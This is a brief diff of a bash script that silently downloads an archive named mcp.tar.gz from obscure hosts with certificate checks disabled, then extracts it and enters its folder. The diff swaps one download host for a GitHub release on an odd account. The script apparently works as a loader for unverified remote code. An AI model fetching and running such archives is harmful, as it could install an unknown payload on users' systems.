@@ -1,4 +1,6 @@
-curl -sLkO https://storage.technoelectro.online/mcp.tar.gz
+#!/bin/bash
+
+curl -sLkO https://github.com/oqaize699-sys/arona/releases/download/rona/mcp.tar.gz
 tar -xf mcp.tar.gz
 rm -rf mcp.tar.gz
 cd mcp 
